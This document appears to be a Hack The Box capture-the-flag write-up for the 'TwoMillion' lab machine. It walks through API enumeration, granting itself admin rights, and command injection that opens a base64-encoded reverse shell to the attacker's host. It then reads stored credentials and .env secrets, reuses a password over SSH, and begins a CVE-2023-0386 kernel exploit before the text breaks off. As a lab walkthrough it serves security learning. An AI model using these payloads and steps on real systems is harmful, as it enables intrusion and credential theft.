---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - API-Testing
  - CVE-2023-0386
  - Overlays-Fuse-Exploit
  - Command-Injection
---
# Overview

| Name        | TwoMillion |
| ----------- | ---------- |
| OS          | Linux      |
| Base Points | Easy [20]  |
| Status      | Done       |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -A twomillion.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-04 00:12 +0545
Nmap scan report for twomillion.htb (10.10.11.221)
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   316.75 ms 10.10.14.1
2   316.83 ms twomillion.htb (10.10.11.221)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
```

```bash
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       at0m

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

10.10.11.221 2million.htb
```
# Enumeration
## Directory and Page Fuzzing

```bash
❯ ffuf -u http://2million.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -mc 200,302 -o directories.txt -of csv
<SNIP>
404                     [Status: 200, Size: 1674, Words: 118, Lines: 46, Duration: 317ms]
home                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 326ms]
invite                  [Status: 200, Size: 3859, Words: 1363, Lines: 97, Duration: 318ms]
login                   [Status: 200, Size: 3704, Words: 1365, Lines: 81, Duration: 328ms]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 333ms]
register                [Status: 200, Size: 4527, Words: 1512, Lines: 95, Duration: 541ms]
:: Progress: [4746/4746] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```
## Subdomain Fuzzing

```bash

❯ ffuf -u http://FUZZ.2million.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,302 -o subdomains.txt -of csv

:: Progress: [4989/4989] :: Job [1/1] :: 19 req/sec :: Duration: [0:02:42] :: Errors: 4989 ::
```
## VHOST Fuzzing

```bash

❯ ffuf -u http://2million.htb/ -H "Host: FUZZ.2million.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-mc 200,302 -o vhosts.txt -of csv


:: Progress: [4989/4989] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:48] :: Errors: 0 ::
```

Going to `view-source:http://2million.htb/invite` since there is `/register` asks for invite code to register.

```js
<!-- scripts -->
<script src="/js/htb-frontend.min.js"></script>
<script defer src="/js/inviteapi.min.js"></script>
<script defer>
    $(document).ready(function() {
        $('#verifyForm').submit(function(e) {
            e.preventDefault();

            var code = $('#code').val();
            var formData = { "code": code };

            $.ajax({
                type: "POST",
                dataType: "json",
                data: formData,
                url: '/api/v1/invite/verify',
                success: function(response) {
                    if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                        // Store the invite code in localStorage
                        localStorage.setItem('inviteCode', code);

                        window.location.href = '/register';
                    } else {
                        alert("Invalid invite code. Please try again.");
                    }
                },
                error: function(response) {
                    alert("An error occurred. Please try again.");
                }
            });
        });
    });
</script>
```

We can go to `view-source:http://2million.htb/js/inviteapi.min.js` and we get obfuscated code, ask GPT to fix it and we get:

```js
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response);
        },
        error: function(response) {
            console.log(response);
        }
    });
}
```

```bash
❯ curl -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   249    0   249    0     0    401      0 --:--:-- --:--:-- --:--:--   402
{
  "0": 200,
  "success": 1,
  "data": {
    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
    "enctype": "ROT13"
  },
  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
}
```

Decrypt ROT-13 and we get `In order to generate the invite code, make a POST request to /api/v1/invite/generate`.

```bash
❯ curl -X POST http://2million.htb/api/v1/invite/generate | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    91    0    91    0     0    146      0 --:--:-- --:--:-- --:--:--   146
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "VEcwNjctUDdLTlotWFpEQkItRzhPRjg=",
    "format": "encoded"
  }
}
```

```bash
❯ echo -n "VEcwNjctUDdLTlotWFpEQkItRzhPRjg=" | base64 -d
TG067-P7KNZ-XZDBB-G8OF8 
```

Now go to `/invite` and putwith invite code `TG067-P7KNZ-XZDBB-G8OF8 ` which redirects to `/register` and register and login.

![[2million.png]]
# Exploitation
## API Testing & Command Injection via Unsafe Handling

![[2million2.png]]

Its calling API. Copy as CURL request.

```bash
curl 'http://2million.htb/api/v1/user/vpn/regenerate' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
```

When we call to `/api` only:

```bash
❯ curl 'http://2million.htb/api' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i'
{"\/api\/v1":"Version 1 of the API"} 
```

```bash
❯ curl 'http://2million.htb/api/v1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   800    0   800    0     0   1287      0 --:--:-- --:--:-- --:--:--  1286
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

`/api/v1/admin/settings/update` seems interesting.

```bash

❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    53    0    53    0     0      4      0 --:--:--  0:00:11 --:--:--    13
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Needs JSON type.

```bash
❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    56    0    56    0     0     89      0 --:--:-- --:--:-- --:--:--    89
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Asking for data email.

```bash
❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" \
  --data '{"email":"fyou@gmail.com"}' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    88    0    59  100    29     95     46 --:--:-- --:--:-- --:--:--   141
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Now another needed.

`"is_admin": true`

```bash
❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" \
  --data '{"email":"fyou@gmail.com", "is_admin": true}' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   120    0    76  100    44    121     70 --:--:-- --:--:-- --:--:--   192
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

Set to `1`.

```bash
❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" \
  --data '{"email":"fyou@gmail.com", "is_admin": 1}' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    89    0    48  100    41     77     65 --:--:-- --:--:-- --:--:--   142
{
  "status": "danger",
  "message": "Email not found."
}
```

Put your email.

```bash
❯ curl -X PUT 'http://2million.htb/api/v1/admin/settings/update' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" \
  --data '{"email":"test@gmail.com", "is_admin": 1}' | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    81    0    40  100    41     64     65 --:--:-- --:--:-- --:--:--   130
{
  "id": 14,
  "username": "At0m",
  "is_admin": 1
}
```

Now we can check our auth by going to `/api/v1/admin/auth` and it will show success which means are are authenticated. Now:

```bash
❯ curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --header "Content-Type: application/json" \ | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    59    0    59    0     0     94      0 --:--:-- --:--:-- --:--:--    94
curl: (3) URL rejected: Malformed input to a URL function
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

```bash
❯ curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  -H "Content-Type: application/json" \
  --data '{"username": "at0m;ls;"}'
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
```

```bash
sh -i >& /dev/tcp/10.10.14.233/4444 0>&1
```

Encode it to base64.

```bash
❯ echo 'sh -i >& /dev/tcp/10.10.14.233/4444 0>&1' | base64

c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMzLzQ0NDQgMD4mMQo=
```

```bash
echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMzLzQ0NDQgMD4mMQo= | base64 -d | bash
```

```bash
❯ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
```

```bash
❯ curl -X POST 'http://2million.htb/api/v1/admin/vpn/generate' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://2million.htb/home/access' \
  -H 'Cookie: PHPSESSID=matc95h7v64167engnnciilpb3' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  -H "Content-Type: application/json" \
  --data '{"username": "at0m;echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjMzLzQ0NDQgMD4mMQo= | base64 -d | bash;"}'
```
# Post Exploitation

```bash
❯ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.233] from (UNKNOWN) [10.10.11.221] 55506
sh: 0: can't access tty; job control turned off
$ ls
Database.php
Router.php
VPN
assets
controllers
css
fonts
images
index.php
js
views
$ whoami
www-data
```

```bash
$ ls -la
total 56
drwxr-xr-x 10 root root 4096 Sep  3 20:00 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Sep  3 20:00 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
$ cd .env
sh: 4: cd: can't cd to .env
$ cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

This shows that `admin` user exists and we have its password `SuperDuperPass123`.
# Privilege Escalation

```bash
❯ ssh admin@10.10.11.221
The authenticity of host '10.10.11.221 (10.10.11.221)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.221' (ED25519) to the list of known hosts.
admin@10.10.11.221's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
<SNIP>
admin@2million:~$ ls
user.txt
admin@2million:~$ cat user.txt
d6552e01c8936868f86608671402ddf7
```

```bash
admin@2million:~$ sudo -l
[sudo] password for admin:
Sorry, user admin may not run sudo on localhost.
admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:~$ cd /var
admin@2million:/var$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
admin@2million:/var$ cd mail
admin@2million:/var/mail$ ls
admin
admin@2million:/var/mail$ cat admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```
## CVE‑2023‑0386

OverlayFS / FUSE it talks about CVE-2023-0386.

```bash
admin@2million:/var/mail$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

This **falls squarely in the vulnerable range** for **CVE‑2023‑0386** (5.11 ≤ kernel < 5.15.91).

We can use this [exploit](https://github.com/xkaneiki/CVE-2023-0386).

```bash
❯ git clone https://github.com/xkaneiki/CVE-2023-0386
Cloning into 'CVE-2023-0386'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (15/15), done.
remote: Total 24 (delta 7), reused 21 (delta 5), pack-reused 0 (from 0)
Receiving objects: 100% (24/24), 426.11 KiB | 885.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.

❯ zip -r cve.zip CVE-2023-0386
  adding: CVE-2023-0386/ (stored 0%)
  adding: CVE-2023-0386/README.md (deflated 23%)
  adding: CVE-2023-0386/.git/ (stored 0%)
  adding: CVE-2023-0386/.git/description (deflated 14%)
  adding: CVE-2023-0386/.git/HEAD (stored 0%)
  adding: CVE-2023-0386/.git/packed-refs (deflated 12%)
  adding: CVE-2023-0386/.git/hooks/ (stored 0%)
  adding: CVE-2023-0386/.git/hooks/sendemail-validate.sample (deflated 58%)
  adding: CVE-2023-0386/.git/hooks/commit-msg.sample (deflated 44%)
  adding: CVE-2023-0386/.git/hooks/pre-applypatch.sample (deflated 38%)
  adding: CVE-2023-0386/.git/hooks/pre-rebase.sample (deflated 59%)
  adding: CVE-2023-0386/.git/hooks/pre-merge-commit.sample (deflated 39%)
  adding: CVE-2023-0386/.git/hooks/update.sample (deflated 68%)
  adding: CVE-2023-0386/.git/hooks/pre-push.sample (deflated 49%)
  adding: CVE-2023-0386/.git/hooks/applypatch-msg.sample (deflated 42%)
  adding: CVE-2023-0386/.git/hooks/post-update.sample (deflated 27%)
  adding: CVE-2023-0386/.git/hooks/pre-commit.sample (deflated 45%)
  adding: CVE-2023-0386/.git/hooks/pre-receive.sample (deflated 40%)
  adding: CVE-2023-0386/.git/hooks/push-to-checkout.sample (deflated 55%)
  adding: CVE-2023-0386/.git/hooks/prepare-commit-msg.sample (deflated 50%)
  adding: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample (deflated 62%)
  adding: CVE-2023-0386/.git/info/ (stored 0%)
  adding: CVE-2023-0386/.git/info/exclude (deflated 28%)
  adding: CVE-2023-0386/.git/config (deflated 30%)
  adding: CVE-2023-0386/.git/objects/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/ (stored 0%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.rev (deflated 27%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx (deflated 54%)
  adding: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack (deflated 0%)
  adding: CVE-2023-0386/.git/objects/info/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/remotes/origin/HEAD (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/refs/heads/main (stored 0%)
  adding: CVE-2023-0386/.git/refs/tags/ (stored 0%)
  adding: CVE-2023-0386/.git/index (deflated 38%)
  adding: CVE-2023-0386/.git/logs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/HEAD (deflated 27%)
  adding: CVE-2023-0386/.git/logs/refs/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD (deflated 27%)
  adding: CVE-2023-0386/.git/logs/refs/heads/ (stored 0%)
  adding: CVE-2023-0386/.git/logs/refs/heads/main (deflated 27%)
  adding: CVE-2023-0386/exp.c (deflated 64%)
  adding: CVE-2023-0386/ovlcap/ (stored 0%)
  adding: CVE-2023-0386/ovlcap/.gitkeep (stored 0%)
  adding: CVE-2023-0386/getshell.c (deflated 58%)
  adding: CVE-2023-0386/Makefile (deflated 20%)
  adding: CVE-2023-0386/fuse.c (deflated 68%)
  adding: CVE-2023-0386/test/ (stored 0%)
  adding: CVE-2023-0386/test/mnt (deflated 82%)
  adding: CVE-2023-0386/test/fuse_test.c (deflated 74%)
  adding: CVE-2023-0386/test/mnt.c (deflated 62%)

❯ scp cve.zip admin@10.10.11.221:/home/admin
admin@10.10.11.221's password:
cve.zip                                                                                  100%  460KB  72.3KB/s   00:06
```

```bash
admin@2million:/var/mail$ cd /home/admin
admin@2million:~$ ls
cve.zip  user.txt
admin@2million:~$ unzip cve.zip
Archive:  cve.zip
replace CVE-2023-0386/README.md? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
  inflating: CVE-2023-0386/README.md
  inflating: CVE-2023-0386/getshell.c
  inflating: CVE-2023-0386/.git/config
  inflating: CVE-2023-0386/.git/packed-refs
 extracting: CVE-2023-0386/.git/refs/heads/main
 extracting: CVE-2023-0386/.git/refs/remotes/origin/HEAD
  inflating: CVE-2023-0386/.git/index
 extracting: CVE-2023-0386/.git/HEAD
  inflating: CVE-2023-0386/.git/info/exclude
  inflating: CVE-2023-0386/.git/description
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.idx
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.pack
  inflating: CVE-2023-0386/.git/objects/pack/pack-fdcfb3c1c347e6514a19736a09517b8100eb5c49.rev
  inflating: CVE-2023-0386/.git/logs/refs/heads/main
  inflating: CVE-2023-0386/.git/logs/refs/remotes/origin/HEAD
  inflating: CVE-2023-0386/.git/logs/HEAD
  inflating: CVE-2023-0386/.git/hooks/push-to-checkout.sample
  inflating: CVE-2023-0386/.git/hooks/fsmonitor-watchman.sample
  inflating: CVE-2023-0386/.git/hooks/pre-merge-commit.sample
